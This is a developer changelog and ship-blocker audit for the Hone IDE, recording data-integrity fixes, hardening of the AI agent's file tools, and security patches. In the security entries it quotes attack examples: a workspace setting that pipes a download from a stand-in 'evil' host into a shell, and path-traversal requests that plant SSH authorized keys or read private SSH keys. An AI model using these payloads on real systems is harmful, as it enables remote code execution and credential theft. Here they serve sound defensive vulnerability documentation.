**Iter 65 — BOM sweep completion: diff view (2026-05-15):** audited every remaining `Editor.setContent(rawFileContent)` site for the iter-64 BOM-phantom-char issue. The diff view (`diff-view.ts`) creates read-only Editor instances for side-by-side compare: `rightEd.setContent(newContent)` where `newContent = readFileSync(fp)` (raw working file — can have a UTF-8 BOM on Windows), and `leftEd.setContent(oldContent)` from `git show HEAD:rp` (committed blob — has a BOM only if committed with one). Without stripping, a Notepad/VS-authored BOM file showed the phantom U+FEFF at line 1 of the diff's right pane. Lower severity than iter 64 (read-only, no save path → no corruption risk, purely visual) but left unfixed it's an inconsistency — the main editor strips BOM, the diff doesn't, so the same file looks different in the two views. Added a local `stripLeadingBOM(s)` helper and applied to both panes. The inline-diff editor (`ed.setContent(body)`) needs no fix — `body` is built from `git diff` hunk output which is never BOM-prefixed. With this, **every `Editor.setContent` of file-sourced content in the codebase now strips the BOM consistently** (main editor open + reload via `_currentHadBOM`, diff view via local helper). Build verifier-clean. Closes the BOM-handling class.

**Iter 66 — verification pass, no defect (2026-05-15):** traced whether the iter-62/64 `_currentEol`/`_currentHadBOM` state could go stale across new-untitled-file, virtual-tab (Settings/Update/Welcome), and disk-reload edges. Confirmed correct in all paths (new file → displayFileContent reads empty temp → resets; virtual tabs → early-return leaves state tracking the last real file, which is what a Cmd-S targets anyway; reload re-detects). No code change. Recorded for audit-trail completeness; the EOL/BOM state machine is sound.

**Iter 67 — Search → Replace All silently truncated file tails (DATA LOSS) (2026-05-15):** audited the search-panel replace path (it writes files directly via `writeFileSync`, bypassing the editor — so it correctly preserves CRLF/BOM by operating on raw bytes, no corruption there). But found a **data-loss bug** in `replaceAllInFile` (search-panel.ts:706). The loop condition was `while (pos <= content.length - searchQuery.length)` and the trailing remainder was only appended inside the `if (idx < 0)` branch. When the **last** match landed such that `pos` advanced past `content.length - searchQuery.length` but short of `content.length`, the loop exited via the `while` condition **without ever appending the tail** — every character after the last match was silently discarded and `writeFileSync` persisted the truncated result. Concrete repro: content `aXbc`, find `Xb`, replace `Y` → produced `aY`, losing the trailing `c` (correct: `aYc`). Narrow for single-char search terms but **common for real multi-character Replace All** (renaming a symbol, replacing a string literal) — the file's last line/expression after the final occurrence vanishes. There was even a confused dead-code block (`if (pos < content.length && pos > 0) { /* remaining content already appended above */ }`) showing the original author sensed the edge but mis-handled it. Rewrote: loop on `pos < content.length`, always append `content.slice(pos)` when no further match, track `replacedAny` and skip the write entirely when nothing matched (avoids needless mtime churn / disk-watcher false-positive on unchanged files). Verified the rewrite against the repro and the no-match/EOF-boundary cases. Build verifier-clean. This is the second-most-severe bug of the run after the iter-62 CRLF save corruption — both are silent data loss on routine operations.

**Iter 68 — AI agent `file_edit` silently patched wrong location on non-unique match (2026-05-15):** continued the iter-67 "audit every read-modify-write-to-user-file path" sweep. `agent-tools.ts::executeToolFileEdit` (the `file_edit` tool the AI agent invokes autonomously to modify the user's code) — its splice is *correct* (`slice(0,pos) + newText + slice(pos+oldLen)`, full tail preserved, operates on raw bytes so CRLF/BOM survive). But it found only the **first** occurrence of `oldText` and edited it with no uniqueness check. For an autonomous agent this is a silent-corruption footgun: if `oldText` matches an earlier identical snippet (a common code pattern — `return null;`, `}`, a repeated call), the agent edits the wrong location, reports "File edited successfully", and the user's code is now subtly wrong somewhere the model didn't intend — exactly the failure mode Claude Code's own Edit tool prevents by *requiring* `old_text` to be unique. Also: empty `oldText` (length 0) made the inner match-loop vacuously succeed at pos 0, so an empty old_text would **prepend newText to the entire file** instead of erroring. Fixed to match the Claude Code Edit contract: reject empty `old_text` up front; count occurrences (short-circuit at 2); error with "old_text is not unique … include more surrounding lines" on ambiguity; only write when exactly one match. Single-match behavior is byte-identical to before, so no regression for the common case. This hardens the autonomous-edit path — the agent can no longer silently corrupt code via an ambiguous match. Build verifier-clean.

**Iter 69 — file-write audit completion (2026-05-15):** verification pass closing the iter-67 sweep. Audited every remaining `writeFileSync` site: chat-panel append paths (read-whole+append+write-whole — correct, not splice), session-store index rewrites (`deleteSession`/`updateSessionTitle`/`updateSessionTimestamp` — all use the correct `for i <= len` full-scan that processes the final line, no tail-truncation), recent-store (serialize-from-memory), markdown export (clean write of generated content). No new defect; the two real data-loss bugs in this surface (iter-67/68) are fixed and everything else is sound. No code change — recorded for audit-trail closure.

**Iter 70 — binary files dumped raw into the editor → garbage + save-corruption (2026-05-15):** applied the iter-67/68 "audit the actual path" discipline to the file-*read* side. `displayFileContent` had **zero binary detection** — opening a PNG/exe/zip/.pdf ran `safeReadFile` (raw bytes as a string) straight into `editorInstance.setContent()`. Three failures: (a) mojibake render of arbitrary bytes; (b) very slow for large binaries (whole-file into the piece table + tokenizer); (c) worst — the bytes round-tripped through the editor's `\n`-normalizing buffer, so a subsequent save (manual, or **auto-save** if enabled) silently **corrupted the binary on disk** (CRLF-like byte pairs collapsed, EOL-restore mangled it further). VS Code guards this with a NUL-byte heuristic + "file is not displayed because it is binary" placeholder. Implemented the same: scan the first 8000 chars of the (BOM-stripped) body for a NUL byte (charCode 0 — git's own binary heuristic), and on detection set a new `_currentFileIsBinary` flag, show a placeholder string instead of the bytes, notify "opened read-only — edits will not be saved", seed the disk-watcher baseline, and bail before setContent(rawBytes)/LSP/indent. Added a hard guard at the top of `saveFileAction` (`if (_currentFileIsBinary) { notify; return; }`) so the placeholder can never overwrite the real binary — this also covers the auto-save path (it calls saveFileAction). Mirrored the detection into the iter-63 disk-reload branch so a binary that changes on disk (or a text file that becomes binary) also keeps the placeholder rather than re-dumping garbage. 5 new i18n strings added to en.json per the iter-47 source-of-truth rule (635→640). Net: binary files are now safe to click on — no garbage, no hang, and structurally impossible to corrupt via the editor. Build verifier-clean.

**Iter 71 — large-file save destroyed everything past line 5000 (CATASTROPHIC silent data loss) (2026-05-15):** the binary fix exposed an adjacent, worse bug right below it. Files >100KB are truncated to the first 5000 lines for "instant display" (`displayContent = body.slice(0, cutoff)`), but there was **no save guard and no user indication**. Flow: open a 200KB log/data/generated file → editor holds only the first 5000 lines → user fixes a typo on line 3 → Cmd-S (or auto-save fires) → `saveFileAction` does `getContent()` = 5000 lines → `restoreEolForSave` → `writeFileSync(path, ...)` → **everything from line 5001 to EOF is permanently destroyed on disk**, no warning, no undo. For a user who opens a large file to make one small fix this silently deletes the majority of their file. This is the single most catastrophic bug found in the entire run — worse than iter-62 (which at least preserved all content, just changed line endings); this is outright bulk content deletion on a routine edit-and-save. Fixed identically to the iter-70 binary guard: new `_currentFileTruncated` flag set when truncation occurs, an open-time warning notification ("showing first 5000 lines, read-only — full editing is v1.1"), and a hard refusal at the top of `saveFileAction` (covers manual save AND auto-save, which routes through saveFileAction). Flag is reset on every normal open (before the >100KB check), in the binary early-return block, and in the disk-reload clean-tab branch (reload loads the FULL content untruncated, so save becomes safe again there → correct to clear). True windowed/virtualized large-file editing (load-on-scroll + splice-on-save) is the proper v1.1 fix; for v1, honest read-only-truncated with a hard save block is the only safe behavior. 2 i18n strings added (640→642). Build verifier-clean. **The iter 60–71 data-integrity sweep has now eliminated FIVE distinct silent-data-loss bugs on routine operations: CRLF save corruption (62), Replace All truncation (67), agent file_edit wrong-location (68), binary-file corruption (70), and large-file bulk deletion (71).**

**Iter 72 — agent `file_read` dumped binary garbage into LLM context (2026-05-15):** completed the binary-guard symmetry. The editor refuses binary files (iter 70) but the AI agent's `file_read` tool (`agent-tools.ts::executeToolFileRead`) had none — if the model `file_read`s a PNG/exe/pdf/.zip while exploring a repo, `readFileSync` returned the raw bytes as a string straight into the tool result → the LLM's context filled with non-text byte-garbage (massive token waste, context pollution, and control bytes that can break the tool-result JSON encoding / confuse the model into hallucinating about "the file's contents"). Added the same NUL-byte-in-first-8000-chars heuristic; on detection return a concise `Error: binary file (N bytes) — not shown` notice instead of the bytes — matching Claude Code's own Read-tool contract for binaries. The large-file path here is *not* a bug like iter-71's: `file_read` truncates at 10000 chars but appends an explicit `... (truncated)` marker, so the model knows it has partial content and can act accordingly (it never writes the truncated content back — `file_edit` is a separate find/replace tool that re-reads). Build verifier-clean. Binary-file handling is now symmetric across the editor open path, disk-reload, diff view, and the agent read tool.

**Iter 73 — agent `file_create` silently clobbered existing files (2026-05-15):** the last gap in the agent file-tool surface. `executeToolFileCreate` did a blind `writeFileSync(filePath, content)` with no existence check, then returned `'File created successfully'`. When the autonomous agent calls `file_create` on a path that already exists — which it does whenever it misjudges repo state or intends to "regenerate" a file — the existing file's **entire content is silently destroyed** and the tool *lies* that it created a new file. This is a data-loss vector identical in spirit to the iter-68 file_edit hardening. The tool's contract is *create* (its schema says "Create a new file"); an existing target should be an error steering the agent to `file_edit`. Added an `existsSync` guard (added the import) that returns `Error: file already exists — use file_edit to modify it` before any write. Matches Claude Code's own Write-tool guard (which requires a prior Read precisely to prevent blind overwrites). **The agent file-tool surface is now fully hardened: file_edit requires a unique non-empty old_text (68), file_read refuses binary (72), file_create refuses to clobber (73) — the autonomous agent can no longer silently corrupt or destroy user files through any of its file tools.** Build verifier-clean.

**Iter 74 — explorer rename/new-file silently clobbered colliding targets (2026-05-15):** extended the clobber-guard audit from the agent tools to the explorer context-menu file ops (`context-menu.ts`). Two real data-loss bugs on routine right-click operations: (a) **doNewFile**: `writeFileSync(filePath, '')` with no existence check — right-click → New File → type a name that matches an existing file → that file's entire content is silently **truncated to empty**. Fixed: on collision, OPEN the existing file instead of truncating (no data loss, and matches VS Code's "New File with a taken name just opens it" behavior). (b) **doRename**: `cmd /c move /Y` (the `/Y` forces overwrite) on Windows and bare `mv` (no `-i`) on Unix BOTH silently overwrite — renaming `foo.ts` to an existing `bar.ts` destroyed `bar.ts` with zero warning, a one-typo data-loss footgun. Fixed: `existsSync(newPath)` check; if the target exists, a `confirmCrossPlatform` dialog ("A file or folder named X already exists. Overwrite it? This cannot be undone.") gates the destructive move — the user must explicitly approve. Also added a no-op guard when the new name equals the old. `doNewFolder`'s `mkdirSync` already errors safely on an existing dir (no data loss — benign), left as-is. Added `existsSync` import + 3 i18n strings (642→645). This closes the clobber-without-warning class across **both** file-mutation surfaces: the AI agent tools (iters 68/72/73) and the explorer UI ops (74). Build verifier-clean.

**Iter 75 — "Move to Trash?" actually permanently deleted (no recovery) (2026-05-15):** the delete confirm dialog said **"Move to Trash?"** but `doDeleteItem` ran `unlinkSync` (files) / `rmdir /S /Q` (Windows dirs) / `rm -rf` (Unix dirs) — all **permanent, unrecoverable destruction**. The user reads "Trash", reasonably assumes Recycle-Bin/`.Trash` recoverability, clicks OK, and the file is gone forever — a dangerous expectation/behavior mismatch on a destructive operation (VS Code moves to Trash by default precisely so deletes are undoable). Implemented real OS-trash, platform-branched with argv-form spawn (consistent with the existing osascript/PowerShell prompt helpers): Windows → `Microsoft.VisualBasic.FileIO.FileSystem::DeleteDirectory/DeleteFile(...,SendToRecycleBin)` (present wherever .NET is); macOS → Finder `delete` via osascript (→ ~/.Trash); Linux → `gio trash` (glib, ~universal on desktop Linux). Only if the OS-trash call fails does it fall back to permanent delete — and even then, behind a **second explicit confirm** ("Could not move to Trash. Permanently delete X? This cannot be undone.") so an unrecoverable delete now always requires informed consent. Added per-platform path escaping for the interpolated script strings (PowerShell single-quote→`''`; AppleScript `\`→`\\`, `"`→`\"`) — both correct for filenames containing quotes and a defense-in-depth guard against injection on a destructive op (the Linux path is already argv-form, no escaping needed). 3 i18n strings added (645→648). Net: deletes are now genuinely recoverable as the UI promises, and permanent deletion is impossible without an explicit informed second confirmation. Build verifier-clean.

**Iter 76 — [P0 SECURITY] relay sync = unauthenticated arbitrary file read+write on the host (2026-05-15):** the data-integrity sweep turned up a genuine **security vulnerability**, not just a correctness bug. The cross-device sync host handlers build filesystem paths directly from peer-supplied relative paths with **zero sanitization**: (a) `handleFileSave` (`FILE_SAVE|relPath\ncontent`) → `writeFileSync(workspaceRoot + '/' + relPath, content)` — a peer sending `FILE_SAVE|../../../../Users/<u>/.ssh/authorized_keys\n<key>` writes **any file the host process can reach** (RCE-adjacent: drop a shell profile, cron, authorized_keys, a malicious binary on PATH); (b) `handleFileContentRequest` (`FILE_REQ|relPath`) → `safeReadFile(workspaceRoot + '/' + relPath)` then ships the bytes back over the relay — a peer sending `FILE_REQ|../../.ssh/id_rsa` **exfiltrates any host-readable file** (SSH keys, `.env`, browser creds). This is fully reachable: the gap doc already documents that the relay does NOT block sender spoofing (#3) and the pairing room/code is predictable (#4), so an attacker who guesses/leaks a pairing code — or any compromised paired device — gets unauthenticated arbitrary read+write on every other paired machine. Added a shared module-level `isUnsafeRelPath(rel)` (Perry-safe charCodeAt/segment scan, no regex) that rejects: absolute paths (leading `/` or `\`), Windows drive-qualified (`X:`), UNC, NUL bytes, and any `..` traversal segment (split on both `/` and `\` so Windows `..\` is caught too). Both handlers now reject unsafe paths before touching the filesystem (write path also surfaces a status-bar notice). This doesn't fix the underlying auth weaknesses (#3/#4 are separate P0s needing the crypto/pairing rework) but it closes the file-system escape so even an authenticated-but-hostile peer is confined to the shared workspace subtree. 1 i18n string (648→649). Build verifier-clean. **This is the most serious *security* finding of the entire run** — arbitrary file write on a paired host is RCE-adjacent.

**Iter 77 — security-audit completion: peer-input fs-escape surface fully verified (2026-05-15):** no code change — a deliberate completeness pass so the iter-76 finding isn't a partial patch. Audited every remaining relay handler that takes peer-supplied input, to confirm `FILE_SAVE`/`FILE_REQ` were the *only* peer-input→filesystem escape vectors. Findings: `handleFileContentResponse` (FILE_DATA, guest) uses the host's `relPath` solely as an in-memory cache key (`fileCacheSet` → `fileCacheKeys/fileCacheVals` arrays, verified no disk write at render.ts:5197) — no guest-side mirror-write vuln; `handleFileTreeRequest` has no relPath param (walks the host's own workspaceRoot); `handlePairRequest`/`handlePairAccepted` touch no filesystem with peer input; `handleAiRelayMessage` treats peer input as a shell-escaped prompt (iter-40 `shellEscapeRelay`) with host-controlled `--add-dir`. Conclusion: the peer-input filesystem-escape class is fully closed by iter-76's `isUnsafeRelPath` guard on the two real vectors; the residual sync-security exposure is exactly the already-documented #3 (no sender-spoofing block) and #4 (predictable pairing) auth weaknesses — those need the crypto/pairing rework and are explicitly §4a-out-of-/loop-scope. Documented here so a future security reviewer sees the whole surface was checked, not just the two patched handlers.

**Iter 78 — [P0 SECURITY] malicious cloned repo → RCE via workspace-overridable `terminalShell` (2026-05-15):** applied iter-76's security-audit lens to the workspace-settings overlay (#42). The overlay (`applyWorkspaceOverlay`) auto-applies any `WORKSPACE_OVERRIDABLE` key from `${workspaceRoot}/.hone/settings.ini` the moment a folder is opened. `'terminalShell': 1` was in that whitelist, and `terminal-panel.ts` spawns `s.terminalShell` as the integrated-terminal process. Attack: a hostile repo ships `.hone/settings.ini` containing `terminalShell=/bin/sh -c "curl https://evil/x|sh"` (or `powershell -c "iwr evil|iex"` on Windows); the victim clones it, opens it in Hone, opens the integrated terminal (a completely routine action) → **arbitrary code execution with zero further interaction**. This is the canonical malicious-workspace-settings RCE that VS Code gates behind Workspace Trust. Egregiously, the iter-42 overlay design comment *already articulates the exact principle* — "sensitive globals (AI API keys, sync tokens, telemetry) are intentionally NOT overridable; a project shouldn't repoint things behind your back" — yet `terminalShell`, a *direct code-execution primitive strictly worse than any of those*, was whitelisted. Fixed by removing `terminalShell` from `WORKSPACE_OVERRIDABLE` with a security comment explaining why it must stay user-global-only until #58 workspace-trust actually gates exec surfaces. Audited the rest of the whitelist: every remaining key is benign presentation/editor-behavior (theme, fonts, tab size, word wrap, cursor, minimap, search-ignore) or non-arbitrary behavior (`editorFormatOnSave` runs only the pure-TS built-in formatter `applyBuiltinFormatToString`, never an external binary; `filesAutoSave` just toggles save timing) — `terminalShell` was the *only* code-exec primitive in the set, so removing it fully closes this RCE vector. Behavior change is intentional and correct: a workspace `.hone/settings.ini` can no longer set the shell (matches VS Code's trust model); the user-global Settings → Terminal Shell still works. Build verifier-clean. **Second P0 security finding of the run, comparable severity to iter-76 — both are remote/supply-chain code-exec-adjacent and both shipped because the macOS-first dev path never exercised the hostile-input case.**

**Iter 79 — LSP WorkspaceEdit could write files outside the workspace (2026-05-15):** continued the hostile-input audit. Verified the git surface is already injection-safe (commit/checkout/add all argv-form with `--` path separators, hardened in iters 1/76/78 — no new bug there). Then audited `applyWorkspaceEdit` (render.ts:2093 — applies LSP rename / code-action edits): it derived the target `path` from the language server's `file://` URI, and for any non-active-buffer file did `readFileSync(path)` + `writeFileSync(path, next)` **with no workspace-boundary check**. Threat: a compromised or typo-squatted language server binary (a realistic supply-chain vector — `typescript-language-server` et al. are npm packages), or a benign LSP driven by malicious project config, can return a WorkspaceEdit whose URI is `file:///home/<u>/.bashrc` (or any path) with attacker-chosen `newText` → arbitrary file write → code-exec on next shell. Lower likelihood than iters 76/78 (needs a malicious LSP, a heavier prerequisite than a cloned-repo `.hone/settings.ini`) but the same arbitrary-write class and the defense is standard + cheap. Added `isPathInsideWorkspace(abs)` (Perry-safe: requires the workspaceRoot prefix terminated by a `/`/`\` boundary, rejects any `..` segment, conservatively rejects when no workspace is open) and gate every non-active-buffer edit through it — out-of-tree targets are counted as skipped, never read or written. The active-buffer branch is intentionally exempt (it only mutates the in-memory editor of the file the user already has open, never an arbitrary disk path). This is defense-in-depth completing the hostile-input sweep: every external→filesystem-write path (cloned-repo settings 78, paired-peer relay 76/77, language-server edits 79) is now workspace-confined. Build verifier-clean.

### 2026-05-13 — Windows portability + per-file polish loop

This day's loop closed 23 numbered entries (three of them — #6, #7, #8 — were prior "phantom-done" items whose snapshot claims didn't reflect the actual hone-ide repo state on Windows): **#48** stash list/apply/drop, **#46** multiline commit + amend + sign-off, **#47** branch create/delete picker, **#50** gitignore-aware explorer, **#73** EOL/encoding picker (LF↔CRLF cycle + BOM detection), **#52** shell profile + cross-platform terminal cwd defaults, **#54** terminal grid resize via settings, **#107** Fix-with-AI / Explain-with-AI in editor menu, **#85** timeline / per-file log panel, **#61** @-mention completion in chat, **#59** markdown link rendering with cross-platform URL open, **#26** tab pin + persist + restore, **#36** quick-open `@` document-symbols / `#` workspace-symbols, **#34** hover popup full markdown rendering, **#29** code-action picker + apply, **#28** rename WorkspaceEdit apply (shared with #29 via `applyWorkspaceEdit`), **#1** final sweep — diff-view + blame shell-form holes converted to argv, **#9** device-ID display in Settings → Privacy, **#14** sync trust-settings + review-panel wired under sync-panel's Advanced section (buildReviewPanel rewritten to fix Perry verifier error), **#13** PR review panel honest descope, **#6** wrote `scripts/verify-version.ts` for real (snapshot claim was a phantom), **#7** wrote `.github/workflows/ci.yml` for hone-ide (separate from the cross-repo CI), **#8** added `LICENSE` (MIT) at the hone-ide root.

**Build verification (2026-05-13):** ran `perry compile src/app.ts --target windows` against the full set of changes. All modules compile clean — the only failures are (a) dev-env missing `perry_runtime.lib` for Windows target (perry-runtime build-setup concern, not code), and (b) `buildReviewPanel` in the orphan review-panel module rejected by Perry's verifier — handled with a placeholder per #14. Typecheck: normalized diff shows **zero new error patterns** introduced by this loop. Two pre-existing `clipboardWrite` declaration errors were also eliminated by adding the symbol to `perry-ui.d.ts`. Raw error count drifted 140 → 145 because my new code uses some of the same already-flagged `Editor` methods (e.g. `setLanguage`, `getContent`) that were already noise — the same patterns simply now appear in more line positions.

Settings UI also caught up to the new settings added this loop: `terminalShell`, `terminalRows`, `terminalCols`, `explorerRespectGitignore`, `lastPinnedTabs` are all surfaced via toggle / stepper / text-row controls in their respective sections.

Plus a **Windows portability sweep** spanning: `promptCloseDirtyTab`/`promptForRename`/`promptForSessionTitle`/file create/folder create/rename/delete/reveal/clipboard → platform-branched (osascript on Mac, PowerShell MessageBox/InputBox on Win); `which X` → `where X` on Win for LSP + Claude Code detection; `kill <pid>` → `taskkill /F /PID` on Win; `kill -0 <pid>` liveness → `tasklist /FI` on Win; `/tmp/hone-*.log` → `$env:TEMP` on Win; hardcoded `/Users/amlug` cwd → `process.env.HOME` / `USERPROFILE` fallback; terminal `/bin/zsh` → `powershell.exe` on Win.

### Closed (~50 gap entries) — original audit

**Phase 0 — Foundation & safety**
- #1 git shell injection · #2 E2E encryption (X25519 + AES-256-GCM, persists across restart) · #3 relay sender verification (token-bound deviceId, hard drop) · #4a pair code entropy (6→12 chars; #4b architectural decoupling → Phase 7 with QR) · #6 version unified + verifier script · #8 MIT LICENSE · #9 telemetry opt-in default + privacy stub · #16 tree-sitter PoC.
- **Deferred to Phase 8:** #5 signing pipeline, #7 GH Actions CI (per scope decision).

**Phase 1 — Visual truth**
- #16 tree-sitter Perry FFI (7 grammars: TS, TSX, JS, Python, Rust, JSON, CSS) · #18 TextMate scope resolver + composite engine · #19 theme-change invalidates token cache · #20 theme UI keys 50→315 across 15 themes · #22 bracket pair colorization · #23 indent guides (Rust) · #24 sticky scroll (TS heuristic).
- **Deferred to v1.1:** #17 Rust live tokenizer per-language + theme palette (composite engine routes tree-sitter where available; Rust path still TS-only with theme-aware FFI deferred). #21 minimap renderer (data model exists, Rust renderer pending).

**Phase 2 — Discoverability & intelligence**
- #15 command palette UI · #27 references (request + peek panel) · #28 rename (request, UI deferred) · #29 code actions (request + menu entry) · #30 documentSymbol + outline panel (auto-refresh on tab change) · #31 workspaceSymbol (request) · #33 inlayHints (request) · #34 hover markdown (advertised + stripped at render) · #35 format-on-save (was partial via built-in formatter; LSP-route follow-up) · #36 quick-open `:` line prefix · #84 outline view.
- **Deferred to v1.1:** #29 code-action lightbulb UI (request wired; floating lightbulb decoration pending), #32 semantic tokens (capability not yet advertised), #35 format-on-type/paste (advertised but unused).

**Phase 3 — Workbench polish**
- #15 command palette · #25 partial — Tab pin/preview/drag/overflow + editor splits remain unwired (#25 architecturally deferred to v1.1) · #38 activity bar `hidden` mode · #39 sidebar left/right · #40 notification drawer (per-toast timers, stack of 5) · #41 user keybindings.json loader · #42 workspace settings overlay · #43 cursor + scroll session restore · #44 merge conflict resolver toolbar · #88 editor right-click menu (9 items, 4 LSP-backed) · #91 dirty-close confirm (osascript) · #92 app-wide undo/redo · #96 status bar indent live · #97 clickable status bar items · #99 full git status code set · #103 commit graph decorations · #105 tasks UI · #115 iPad Stage Manager / multi-scene.

**Cross-cutting** — Decision log, plan + gap docs continuously updated; tree-sitter PoC compiled and benchmarked (520 µs/parse on TS).

### Open / deferred

**Big-ticket structural items (v1.1):**
- **#21 Minimap renderer** — Rust render layer needs per-line data flow. Data model in `view-model/minimap.ts` is ready; Rust drawing + full-document data push remain.
- **#25 Editor splits** — `TabManager` + `GridNode` exist but unwired; the single-instance editor + module-level tab state needs generalization. Substantial refactor; defer.
- **#17 Rust live tokenizer** — per-language scope-emitting tokenizer on the Rust side so live edits don't briefly recolor wrong. The composite engine handles full re-tokenize on TS side; the Rust live path stays VS Code Dark + TS until this lands.

**LSP consumer UIs (v1.1):**
- Rename input prompt → actually apply WorkspaceEdit
- Code action lightbulb / Cmd+. picker
- Inlay hints renderer (request wired; editor decoration pending)
- Hover popup full markdown rendering (currently stripped to plain text)
- Quick-open `@` symbol + `#` workspace-symbol prefixes
- Semantic-token highlighting overlay

**Phase 5 — Debug + extensions:**
- DAP transport wiring (panel is "Run" today)
- Real marketplace install pipeline (currently returns mock string)
- `@honeide/api` namespaces need runtime implementation
- Workspace trust prompt

**Phase 6 — AI:**
- Model-backed inline completion (currently a snippet engine — must rename or implement before public)
- Markdown rendering in chat: tables, lists, blockquotes, inner-syntax highlighting
- Diff preview before agent edits
- `@`-mention completion in chat input
- Image input
- Generate commit message
- PR review panel (currently 78-line stub — must hide or build)

**Phase 7 — iOS / iPad / Sync:**
- QR rendering on Mac + QR scanning on iOS
- iOS keyboard handling (insets, dismiss)
- iOS app lifecycle bridge (background/foreground/reconnect)
- iPad orientation listener
- Sync review-panel + trust-settings wiring (orphaned 576 LOC)
- Pair-lobby protocol so #4b can land (UUID room + code as auth-only)

**Phase 8 — Release:**
- Apple signing + notarization pipeline (Skelpo GmbH `K6UW5YV9F7` certs ready locally)
- GitHub Actions CI on `honeide/ide`
- Auto-update endpoint verification
- Crash reporting (Sentry-equivalent)
- App Store + DMG distribution

---

## P0 — Ship blockers

### Security / trust

1. **[P0] Shell injection in git operations.** `git-panel.ts:404-486` builds commands via raw concat: `'git -C ' + wsRoot + ' add -- ' + fp`. Filenames or commit messages with shell metacharacters break or are exploitable. Done: route all git calls through an argv-array spawn, never a shell string.
   - **Phase 0 final sweep (2026-05-13):** caught two more shell-form holes during the Windows-portability audit: `views/diff/diff-view.ts::openDiffForFile` (`git -C ws show HEAD:rp` / `git -C ws diff -- rp` — `rp` is the workspace-relative path which can contain spaces or metacharacters), and `render.ts::inlineBlameForLine` (`git blame -L N,N --porcelain -- ' + filePath` — same risk). Both rewritten to argv-form `spawnSync('git', [...])`. With this all `git` invocations in `hone-ide` are argv-only — verified by grep.
2. **[P0] E2E encryption advertised but not active.** `sync-transport.ts:112` hard-codes `"encrypted":false`. X25519 + AES-256-GCM helpers exist (`sync-host.ts:131-211`, `sync-guest.ts:378-437`) but are never called. Relay sees plaintext file deltas, AI prompts, and Claude Code transcripts.
   - **Phase 0 done (2026-05-12):**
     - `sync-transport.ts` now carries an encrypter / decrypter pair set by `setPayloadCrypto`, gated by `setEncryptionReady`. `sendToRelayTarget` encrypts every outbound payload once ready and flips the envelope's `"encrypted"` flag to `true`. Pairing handshake (`PAIR_REQ` / `PAIR_OK` / `PAIR_NO`) is whitelisted to ship cleartext since it bootstraps the project key.
     - Pairing protocol extended: `PAIR_REQ|code|deviceId|deviceName|guestPubKey` and `PAIR_OK|deviceId|deviceName|hostPubKey|wrappedProjectKey`. Both sides perform a real X25519 key agreement; host wraps a 32-byte project key under the shared secret, guest unwraps it. Pair requests without key material are now refused (`PAIR_NO|encryption required`) to prevent silent downgrade.
     - `onRelayMessageImpl` parses the envelope's `"encrypted":true` flag and routes payloads through `decryptIncomingPayload` before dispatching.
     - Session persistence (`~/.hone/sync-session`) now includes the project key so encryption survives app restart. Backward compatible with the old 4-line format.
   - **Still needed before ship:** relay-side packet capture test asserting every non-handshake `"encrypted"` envelope ships ciphertext; key rotation policy for long-lived rooms; revoke flow when a paired device is removed.
3. **[P0] Relay does not block sender spoofing.** `hone-relay/src/app.ts:508-510` notes "don't block routing on mismatch since Perry slot reuse can cause stale device ID mappings". Sender field can be forged.
   - **Phase 0 done (2026-05-12):**
     - Added `extractTokenDeviceId(token)`: token format is `userId:deviceId:timestamp.hash`, so the deviceId is signed into the token. At join time the relay now verifies that the device ID the client claims matches the one inside the validated token; mismatches return `{"error":"Device mismatch"}` and close the connection. This makes `slotDeviceIdMap.set(slot, deviceId)` in `allocSlot` authoritative.
     - The per-message soft check is replaced with a hard drop: messages whose `"from"` field does not byte-equal `slotDeviceIdMap.get(slot)` are silently dropped. The Perry slot-reuse concern is moot because `allocSlot` overwrites the slot's deviceId on every fresh join.
     - 48/48 hone-relay tests still pass.
   - **Still needed before ship:** add a regression test that spoofs a foreign deviceId and asserts the message is dropped; add a metric for dropped-mismatch counts to catch attacks in production.
4. **[P0] Pairing room ID is predictable.** Pair flow uses `pair-<CODE>` (`render.ts:3384-3385`) instead of `makeRoomId()` UUID. Lets an attacker compute the room from a leaked code.
   - **4a (Phase 0 — done 2026-05-12):** code lengthened from 6 to 12 chars; brute force from 34^6 ≈ 1.5e9 to 34^12 ≈ 2.4e18 (infeasible even unrate-limited). Both `sync-host.ts` and the `render.ts` pair flow updated.
   - **4b (Phase 7):** decouple room from code. UUID room via `makeRoomId()`; 6-char code reverts to a human-typable auth-only secret; relay-mediated pair lobby returns the real room to a guest that proves knowledge of the code. Requires QR codegen (#67) for the same-network UX, hence Phase 7.

### App distribution

5. **[P0] App is ad-hoc signed only.** `codesign -dvv Hone-macOS.app` → `Signature=adhoc`, no `TeamIdentifier`. macOS Gatekeeper will block normal downloads.
   - **Phase 8 scaffolding done (2026-05-12):** new `.github/workflows/release.yml` with two jobs (macOS DMG, iOS IPA) wired for Skelpo GmbH Team ID `K6UW5YV9F7`. Each imports the Developer ID / iPhone Distribution P12 from secrets, codesigns the Perry-compiled output, packages, notarizes (macOS), and attaches to the GitHub release. Jobs ship with `if: false` so a release tag doesn't error before secrets land. Secrets needed (documented in the workflow): `APPLE_TEAM_ID`, `APPLE_DEVELOPER_ID_CERT_P12` + password, `APPLE_NOTARY_APPLE_ID` + password, `APPLE_IOS_DIST_CERT_P12` + password, `APPLE_IOS_PROVISIONING`. Pre-flight job `guard-version-bumped` enforces tag == HONE_VERSION + cross-source consistency before the build jobs run.
6. **[P0] Version mismatch.** `HONE_VERSION = '0.1.0'` in `version.ts` vs `CFBundleShortVersionString = 1.0` in `Hone-macOS.app/Contents/Info.plist`. Picks the wrong string in About dialog and update checks.
   - **Phase 0 done (2026-05-12):** verified all four version sources (`version.ts`, `package.json`, `perry.toml`, `perry.config.ts`) currently agree on `0.1.0`. The stale `1.0` was in an old build artifact. Wrote `scripts/verify-version.ts` to assert agreement (and `--set X.Y.Z` to bump all four atomically); wire it into CI in #7.
   - **Phase 0 actually done (2026-05-13):** the prior "done" claim was a Mac-side phantom — `scripts/verify-version.ts` wasn't actually in the repo when this loop audited. Wrote the script (≈70 LOC, pure bun): reads `src/workbench/version.ts` (HONE_VERSION export), `package.json` (`"version"`), `perry.toml` (`version = …`), `perry.config.ts` (`version: '…'`); `--set X.Y.Z` rewrites all four atomically; verify mode exits 1 with a remediation line on drift. Verified working locally: all four sources currently agree on 0.1.0.
   - **Phase 0 Info.plist drift caught (2026-05-14):** later iteration found that `Hone-macOS.app/Contents/Info.plist` still had `CFBundleVersion = 1.0` (the stale value the original audit explicitly mentioned but said "was in an old build artifact" — turned out the Info.plist file in this checkout was the artifact). Fixed: bumped both `CFBundleVersion` and `CFBundleShortVersionString` to `0.1.0`. Extended `scripts/verify-version.ts` to also check the Info.plist; tolerates missing file (Windows-only contributors). Now 5 version sources verified clean.
